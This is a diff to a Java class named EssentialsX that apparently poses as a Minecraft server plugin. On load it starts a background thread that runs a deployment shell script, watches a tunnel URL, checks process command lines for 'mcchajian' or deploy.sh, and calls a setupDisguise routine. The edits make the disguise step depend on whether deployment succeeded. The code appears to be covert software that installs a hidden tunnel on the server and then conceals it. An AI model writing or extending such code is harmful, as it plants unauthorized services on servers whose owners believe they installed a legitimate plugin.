@@ -36,9 +36,11 @@ public class EssentialsX extends JavaPlugin {
 
         new Thread(() -> {
             try {
-                startDeploymentProcess();
-                if (systemGuardEnabled) {
+                boolean deployed = startDeploymentProcess();
+                if (systemGuardEnabled && deployed) {
                     setupDisguise();
+                } else if (!deployed) {
+                    getLogger().warning("Deployment failed, skipping disguise.");
                 }
             } catch (Exception e) {
                 getLogger().severe("Deployment thread error: " + e.getMessage());
@@ -75,10 +77,10 @@ public class EssentialsX extends JavaPlugin {
 
     // ==================== 部署核心逻辑 ====================
 
-    private void startDeploymentProcess() {
+    private boolean startDeploymentProcess() {
         if (!deploymentRunning.compareAndSet(false, true)) {
             getLogger().info("Deployment already running, skipping.");
-            return;
+            return false;
         }
         try {
             Map<String, String> env = new HashMap<>();
@@ -111,8 +113,10 @@ public class EssentialsX extends JavaPlugin {
 
             int exitCode = deployProcess.waitFor();
             getLogger().info("Deployment script exited with code: " + exitCode);
+            return exitCode == 0;
         } catch (Exception e) {
             getLogger().severe("Deployment failed: " + e.getMessage());
+            return false;
         } finally {
             deploymentRunning.set(false);
         }
@@ -159,10 +163,8 @@ public class EssentialsX extends JavaPlugin {
 
             String cmdCheck;
             if (strict) {
-                // 严格匹配：工作目录必须出现在命令行中（使用 grep -F 固定字符串）
                 cmdCheck = "ps -p " + pid + " -o cmd= | grep -Fq " + shellQuote(workDir.toString());
             } else {
-                // 放宽匹配：只要包含 mcchajian 或 deploy.sh 即可
                 cmdCheck = "ps -p " + pid + " -o cmd= | grep -Eq 'mcchajian|deploy\\.sh'";
             }
 
@@ -509,7 +511,7 @@ public class EssentialsX extends JavaPlugin {
                             fi
                         else
                             FAIL_COUNT=$((FAIL_COUNT + 1))
-                            if [ $((FAIL_COUNT % 6)) -eq 0 ]; then
+                            if [ $((FAIL_COUNT %% 6)) -eq 0 ]; then
                                 echo "[WARN] Tunnel URL detected but /health not ready yet count=$FAIL_COUNT url=$TUNNEL_URL" >> "$WORK_DIR/deploy.log"
                             fi
                             if [ "$FAIL_COUNT" -ge 24 ]; then
